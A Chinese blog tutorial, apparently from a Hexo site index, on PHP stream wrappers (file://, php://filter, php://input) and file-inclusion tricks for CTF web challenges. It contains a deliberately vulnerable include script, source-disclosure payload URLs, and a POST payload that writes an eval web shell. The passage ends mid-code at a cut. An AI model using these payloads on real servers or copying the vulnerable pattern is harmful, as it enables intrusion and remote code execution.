<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>PHP Protocols and File Inclusion Vulnerabilities</title>
      <link href="/2020/05/25/PHP-Protocols-and-File-Inclusion-Vulnerabilities/"/>
      <url>/2020/05/25/PHP-Protocols-and-File-Inclusion-Vulnerabilities/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-PHP伪协议"><a href="#0x01-PHP伪协议" class="headerlink" title="0x01 PHP伪协议"></a>0x01 PHP伪协议</h2><p>PHP伪协议事实上是其支持的协议与封装协议，会多次出现在CTFweb题中，并且有很多妙用。</p><p>PHP中支持的协议种类一共有12种:<br><a href="https://www.php.net/manual/zh/wrappers.file.php">file</a>、<a href="https://www.php.net/manual/zh/wrappers.http.php">http</a>、<a href="https://www.php.net/manual/zh/wrappers.ftp.php">ftp</a>、<a href="https://www.php.net/manual/zh/wrappers.php.php">php</a>、<a href="https://www.php.net/manual/zh/wrappers.zlib.php">zlib</a>、<a href="https://www.php.net/manual/zh/wrappers.data.php">data</a>、<a href="https://www.php.net/manual/zh/wrappers.glob.php">glob</a>、<a href="https://www.php.net/manual/zh/wrappers.phar.php">phar</a>、<a href="https://www.php.net/manual/zh/wrappers.ssh2.php">ssh2</a>、<a href="https://www.php.net/manual/zh/wrappers.rar.php">rar</a>、<a href="https://www.php.net/manual/zh/wrappers.ogg.php">ogg</a>、<a href="https://www.php.net/manual/zh/wrappers.expect.php">expect</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">file:<span class="comment">//    — 访问本地文件系统</span></span><br><span class="line">http:<span class="comment">//    — 访问 HTTP(s) 网址</span></span><br><span class="line">ftp:<span class="comment">//     — 访问 FTP(s) URLs</span></span><br><span class="line">php:<span class="comment">//     — 访问各个输入/输出流（I/O streams）</span></span><br><span class="line">zlib:<span class="comment">//    — 压缩流</span></span><br><span class="line">data:<span class="comment">//    — 数据（RFC 2397）</span></span><br><span class="line">glob:<span class="comment">//    — 查找匹配的文件路径模式</span></span><br><span class="line">phar:<span class="comment">//    — PHP 归档</span></span><br><span class="line">ssh2:<span class="comment">//    — Secure Shell 2</span></span><br><span class="line">rar:<span class="comment">//     — RAR</span></span><br><span class="line">ogg:<span class="comment">//     — 音频流</span></span><br><span class="line">expect:<span class="comment">//  — 处理交互式的流</span></span><br></pre></td></tr></table></figure><h3 id="0x001-file-协议"><a href="#0x001-file-协议" class="headerlink" title="0x001 file:&#x2F;&#x2F;协议"></a>0x001 file:&#x2F;&#x2F;协议</h3><p>PHP.ini：</p><p><strong>file:&#x2F;&#x2F; 协议在双off的情况下也可以正常使用:</strong></p><blockquote><p>allow_url_fopen ：off&#x2F;on</p><p>allow_url_include：off&#x2F;on</p></blockquote><p><strong>file:&#x2F;&#x2F; 用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响</strong></p><p><strong>实例</strong></p><p>新建cmd.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$page</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$page</span>))&#123;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$page</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload:</p><p><em>file:&#x2F;&#x2F;{文件的绝对路径和文件名}</em></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/cmd.php?file=file://E:/phpStudy/WWW/phpinfo.php</span><br></pre></td></tr></table></figure><p>即可读取.</p><h3 id="0x002-php-协议"><a href="#0x002-php-协议" class="headerlink" title="0x002 php:&#x2F;&#x2F;协议"></a>0x002 php:&#x2F;&#x2F;协议</h3><p>条件：</p><blockquote><p>不需要开启allow_url_fopen</p><p>仅php:&#x2F;&#x2F;input、 php:&#x2F;&#x2F;stdin、 php:&#x2F;&#x2F;memory 和 php:&#x2F;&#x2F;temp 需要开启allow_url_include。</p></blockquote><p>应用：</p><blockquote><p>php:&#x2F;&#x2F; 访问各个输入&#x2F;输出流（I&#x2F;O streams）</p><p>在CTF中经常使用的是php:&#x2F;&#x2F;filter和php:&#x2F;&#x2F;input</p><p>php:&#x2F;&#x2F;filter用于读取源码</p><p>php:&#x2F;&#x2F;input用于执行php代码</p></blockquote><p><code>php://stdin</code>是只读的</p><p><code>php://stdout</code> 和 <code>php://stderr</code> 是只写的。</p><h4 id="php-stdin"><a href="#php-stdin" class="headerlink" title="php:&#x2F;&#x2F;stdin"></a>php:&#x2F;&#x2F;stdin</h4><p>打开一个文件指针进行读取<code>fopen(&#39;php://stdin&#39;,&#39;r&#39;)</code></p><h4 id="php-stdout"><a href="#php-stdout" class="headerlink" title="php:&#x2F;&#x2F;stdout"></a>php:&#x2F;&#x2F;stdout</h4><p>打开一个文件指针进行写入<code>fopen(&#39;php://stdout&#39;, &#39;w&#39;);</code></p><h4 id="php-stderr"><a href="#php-stderr" class="headerlink" title="php:&#x2F;&#x2F;stderr"></a>php:&#x2F;&#x2F;stderr</h4><p>打开一个文件指针进行写入<code> fopen( &#39;php://stderr&#39;, &#39;w&#39; );</code></p><h4 id="php-filter"><a href="#php-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h4><p><strong>注:</strong></p><p><strong>php:&#x2F;&#x2F;filter 读取源代码并进行base64编码输出，不然会直接当做php代码执行就看不到源代码内容了。</strong></p><p>PHP.ini：</p><p>php:&#x2F;&#x2F;filter在双off的情况下也可以正常使用；</p><blockquote><p>allow_url_fopen ：off&#x2F;on</p><p>allow_url_include：off&#x2F;on</p></blockquote><p><code>php://filter</code> 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。</p><table><thead><tr><th align="center">名称</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">resource&#x3D;&lt;要过滤的数据流&gt;</td><td align="center">这个参数是必须的。它指定了你要筛选过滤的数据流。</td></tr><tr><td align="center">read&#x3D;&lt;读链的筛选列表&gt;</td><td align="center">该参数可选。可以设定一个或多个过滤器名称，以管道符 （ | ）分隔。</td></tr><tr><td align="center">write&#x3D;&lt;写链的筛选列表&gt;</td><td align="center">该参数可选。可以设定一个或多个过滤器名称，以管道符（ | ）分隔。</td></tr><tr><td align="center">&lt;;两个链的筛选列表&gt;</td><td align="center">任何没有以 read&#x3D; 或 write&#x3D; 作前缀 的筛选器列表会视情况应用于读或写链。</td></tr></tbody></table><p><strong>可以运用多种过滤器（字符串&#x2F;转换&#x2F;压缩&#x2F;加密）</strong><br>例如平时我们用来<strong>任意文件读取</strong>的payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/read=convert.base64-encode/resource=upload.php</span></span><br><span class="line">这里读的过滤器为convert.base64-encode,把输入流进行base64编码</span><br><span class="line">resource=upload.php，代表读取upload.php的内容</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/cmd.php?file=php://filter/read=convert.base64-encode/resource=./cmd.php</span><br></pre></td></tr></table></figure><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200524161149988.png" alt="image-20200524161149988"></p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200524161102548.png" alt="image-20200524161102548"></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/cmd.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.php</span><br></pre></td></tr></table></figure><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200524162107743.png" alt="image-20200524162107743"></p><p><strong>灵活使用</strong></p><p>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;&lt;读取链需要应用的过滤器列表&gt;</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/cmd.php?file=php://filter/read=convert.base64-encode|string.toupper|string.rot14/resource=phpinfo.php</span><br></pre></td></tr></table></figure><h4 id="php-input"><a href="#php-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h4><p><strong>php:&#x2F;&#x2F;input可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行。</strong> </p><p><code>php://input</code> 是个可以访问请求的原始数据的只读流。因为它不依赖于特定的 <code>php.ini</code> 指令。<br><strong>注：enctype&#x3D;”multipart&#x2F;form-data” 的时候 <code>php://input</code> 是无效的。</strong></p><p><strong>PHP.ini：</strong></p><blockquote><p>allow_url_fopen ：off&#x2F;on</p><p>allow_url_include：on</p></blockquote><p>payload:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://lab.l0ki.top/cmd.php?file=php://input</span><br><span class="line">同时POST：file=&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200524193720261.png" alt="image-20200524193720261"></p><p>需要注意:</p><ul><li>测试过程中必须要开启allow_url_include，否则会报错</li><li>非测试状态下则需要关闭，否则造成任意代码执行</li></ul><p><strong>实战中也可以POST如下内容生成一句话：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(“shell.php”,”w”),’&lt;?php <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;cmd&quot;</span>];?&gt;’);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="php-output"><a href="#php-output" class="headerlink" title="php:&#x2F;&#x2F;output"></a>php:&#x2F;&#x2F;output</h4><p><code>php://output</code> 是一个只写的数据流， 允许你以 print 和 echo 一样的方式 写入到输出缓冲区。</p><p>payload:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://lab.l0ki.top/read.php?file=php://output</span><br></pre></td></tr></table></figure><p>read.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$test</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$test</span>,<span class="string">&#x27;this is test&#x27;</span>)</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200524195724335.png" alt="image-20200524195724335"></p><h4 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a><strong>过滤器</strong></h4><p>过滤器有很多种，有字符串过滤器、转换过滤器、压缩过滤器、加密过滤器</p><table><thead><tr><th align="center">名称</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">string.rot13</td><td align="center">进行rot13转换</td></tr><tr><td align="center">string.toupper</td><td align="center">将字符全部大写</td></tr><tr><td align="center">string.tolower</td><td align="center">将字符全部小写</td></tr><tr><td align="center">string.strip_tags</td><td align="center">去除空字符、HTML 和 PHP 标记后的结果，</td></tr><tr><td align="center">功能类似于strip_tags()函数，若不想某些字符不被消除，后面跟上字符，可利用字符串或是数组两种方式</td><td align="center"></td></tr></tbody></table><p><strong>举例</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;php://output&#x27;</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">stream_filter_append</span>(<span class="variable">$fp</span>, <span class="string">&#x27;string.rot13&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;rot13:&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="string">&quot;This is a test.\n&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;php://output&#x27;</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">stream_filter_append</span>(<span class="variable">$fp</span>, <span class="string">&#x27;string.toupper&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Upper:&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="string">&quot;This is a test.\n&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;php://output&#x27;</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">stream_filter_append</span>(<span class="variable">$fp</span>, <span class="string">&#x27;string.tolower&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Lower:&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="string">&quot;This is a test.\n&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;php://output&#x27;</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Del1:&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">stream_filter_append</span>(<span class="variable">$fp</span>, <span class="string">&#x27;string.strip_tags&#x27;</span>, STREAM_FILTER_WRITE);</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="string">&quot;&lt;b&gt;This is a test.&lt;/b&gt;!!!!&lt;h1&gt;~~~~&lt;/h1&gt;\n&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;php://output&#x27;</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Del2:&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">stream_filter_append</span>(<span class="variable">$fp</span>, <span class="string">&#x27;string.strip_tags&#x27;</span>, STREAM_FILTER_WRITE, <span class="string">&quot;&lt;b&gt;&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="string">&quot;&lt;b&gt;This is a test.&lt;/b&gt;!!!!&lt;h1&gt;~~~~&lt;/h1&gt;\n&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;php://output&#x27;</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">stream_filter_append</span>(<span class="variable">$fp</span>, <span class="string">&#x27;string.strip_tags&#x27;</span>, STREAM_FILTER_WRITE, <span class="keyword">array</span>(<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;h1&#x27;</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Del3:&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="string">&quot;&lt;b&gt;This is a test.&lt;/b&gt;!!!!&lt;h1&gt;~~~~&lt;/h1&gt;\n&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200524200557962.png" alt="image-20200524200557962"></p><h4 id="转换过滤器"><a href="#转换过滤器" class="headerlink" title="转换过滤器"></a>转换过滤器</h4><p><strong>convert.base64-encode &amp; convert.base64-decode</strong></p><blockquote><p>base64 编码解码<br>convert.base64-encode和convert.base64-decode使用这两个过滤器等同于分别用 base64_encode()和 base64_decode()函数处理所有的流数据。 convert.base64-encode支持以一个关联数组给出的参数。如果给出了line-length，base64 输出将被用 line-length个字符为长度而截成块。如果给出了 line-break-chars，每块将被用给出的字符隔开。这些参数的效果和用 base64_encode()再加上 chunk_split()相同。</p></blockquote><p>**convert.quoted-printable-encode &amp; convert.quoted-printable-decode **</p><blockquote><p>quoted-printable 编码解码<br>convert.quoted-printable-encode和 convert.quoted-printable-decode等同于用 quoted_printable_decode()函数处理所有的流数据。没有和 convert.quoted-printable-encode相对应的函数。 convert.quoted-printable-encode支持以一个关联数组给出的参数。除了支持和 convert.base64-encode一样的附加参数外，convert.quoted-printable-encode还支持布尔参数 binary和 force-encode-first。 convert.base64-decode只支持 line-break-chars参数作为从编码载荷中剥离的类型提示。</p></blockquote><p><strong>举例</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;php://output&#x27;</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">stream_filter_append</span>(<span class="variable">$fp</span>, <span class="string">&#x27;convert.base64-encode&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;base64-encode:&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="string">&quot;This is a test.\n&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$param</span> = <span class="keyword">array</span>(<span class="string">&#x27;line-length&#x27;</span> =&gt; <span class="number">8</span>, <span class="string">&#x27;line-break-chars&#x27;</span> =&gt; <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;php://output&#x27;</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">stream_filter_append</span>(<span class="variable">$fp</span>, <span class="string">&#x27;convert.base64-encode&#x27;</span>, STREAM_FILTER_WRITE, <span class="variable">$param</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;\nbase64-encode-split:\n&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="string">&quot;This is a test.\n&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;php://output&#x27;</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">stream_filter_append</span>(<span class="variable">$fp</span>, <span class="string">&#x27;convert.base64-decode&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;\nbase64-decode:&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="string">&quot;VGhpcyBpcyBhIHRlc3QuCg==\n&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;php://output&#x27;</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">stream_filter_append</span>(<span class="variable">$fp</span>, <span class="string">&#x27;convert.quoted-printable-encode&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;quoted-printable-encode:&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="string">&quot;This is a test.\n&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;php://output&#x27;</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">stream_filter_append</span>(<span class="variable">$fp</span>, <span class="string">&#x27;convert.quoted-printable-decode&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;\nquoted-printable-decode:&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="string">&quot;This is a test.=0A&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200524201145738.png" alt="image-20200524201145738"></p><h4 id="压缩过滤器"><a href="#压缩过滤器" class="headerlink" title="压缩过滤器"></a>压缩过滤器</h4><p><strong>zlib.deflate和 zlib.inflate</strong></p><blockquote><p>zlib.deflate（压缩）和 zlib.inflate（解压）实现了定义与 » RFC 1951的压缩算法。 deflate过滤器可以接受以一个关联数组传递的最多三个参数。 level定义了压缩强度（1-9）。数字更高通常会产生更小的载荷，但要消耗更多的处理时间。存在两个特殊压缩等级：0（完全不压缩）和 -1（zlib 内部默认值，目前是 6）。 window是压缩回溯窗口大小，以二的次方表示。更高的值（大到 15 —— 32768 字节）产生更好的压缩效果但消耗更多内存，低的值（低到 9 —— 512 字节）产生产生较差的压缩效果但内存消耗低。目前默认的 window大小是 15。 memory用来指示要分配多少工作内存。合法的数值范围是从 1（最小分配）到 9（最大分配）。内存分配仅影响速度，不会影响生成的载荷的大小。<br>Note: 因为最常用的参数是压缩等级，也可以提供一个整数值作为此参数（而不用数组）。</p></blockquote><p><strong>bzip2.compress和 bzip2.decompress</strong></p><blockquote><p>bzip2.compress过滤器接受以一个关联数组给出的最多两个参数：blocks是从 1 到 9 的整数值，指定分配多少个 100K 字节的内存块作为工作区。 work是 0 到 250 的整数值，指定在退回到一个慢一些，但更可靠的算法之前做多少次常规压缩算法的尝试。调整此参数仅影响到速度，压缩输出和内存使用都不受此设置的影响。将此参数设为 0 指示 bzip 库使用内部默认算法。 bzip2.decompress过滤器仅接受一个参数，可以用普通的布尔值传递，或者用一个关联数组中的small单元传递。当small设为&true; 值时，指示 bzip 库用最小的内存占用来执行解压缩，代价是速度会慢一些。</p></blockquote><h4 id="加密过滤器"><a href="#加密过滤器" class="headerlink" title="加密过滤器"></a>加密过滤器</h4><p>_mcrypt.<em>_和 _mdecrypt.</em>_使用 libmcrypt 提供了对称的加密和解密。这两组过滤器都支持 mcrypt 扩展库中相同的算法，格式为_mcrypt.ciphername_，其中 ciphername是密码的名字，将被传递给 mcrypt_module_open()。有以下五个过滤器参数可用：</p><p>mcrypt 过滤器参数</p><table><thead><tr><th align="center">参数</th><th align="center">是否必须</th><th align="center">默认值</th><th align="center">取值举例</th><th></th><th></th></tr></thead><tbody><tr><td align="center">mode</td><td align="center">可选</td><td align="center">cbc</td><td align="center">cbc, cfb, ecb, nofb, ofb, stream</td><td></td><td></td></tr><tr><td align="center">algorithms_dir</td><td align="center">可选</td><td align="center">ini_get(‘mcrypt.algorithms_dir’)</td><td align="center">algorithms 模块的目录</td><td></td><td></td></tr><tr><td align="center">modes_dir</td><td align="center">可选</td><td align="center">ini_get(‘mcrypt.modes_dir’)</td><td align="center">modes 模块的目录</td><td></td><td></td></tr><tr><td align="center">iv</td><td align="center">必选</td><td align="center">N&#x2F;A</td><td align="center">典型为 8，16 或 32 字节的二进制数据。根据密码而定</td><td></td><td></td></tr><tr><td align="center">key</td><td align="center">必选</td><td align="center">N&#x2F;A</td><td align="center">典型为 8，16 或 32 字节的二进制数据。根据密码而定</td><td></td><td></td></tr></tbody></table><p><strong>举例</strong></p><p>phpinfo.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&quot;a&quot;</span>];  </span><br><span class="line"><span class="variable">$data</span>=<span class="string">&quot;test test&quot;</span>;  </span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>);  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure><p><a href="http://www.w3school.com.cn/php/func_filesystem_file_put_contents.asp">PHP file_put_contents() 函数</a></p><p>payload：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://lab.l0ki.top/phpinfo.php?a=php://filter/write=string.tolower/resource=test.php</span><br></pre></td></tr></table></figure><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200524202850271.png" alt="image-20200524202850271"></p><p>以base64的方式显示:</p><p>方法一:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&quot;a&quot;</span>];  </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure><p><a href="http://www.w3school.com.cn/php/func_filesystem_file_get_contents.asp">PHP file_get_contents() 函数</a></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://lab.l0ki.top/phpinfo.php?a=php://filter/convert.base64-encode/resource=test.php</span><br></pre></td></tr></table></figure><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200524203309946.png" alt="image-20200524203309946"></p><p>方法二：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$data</span>=<span 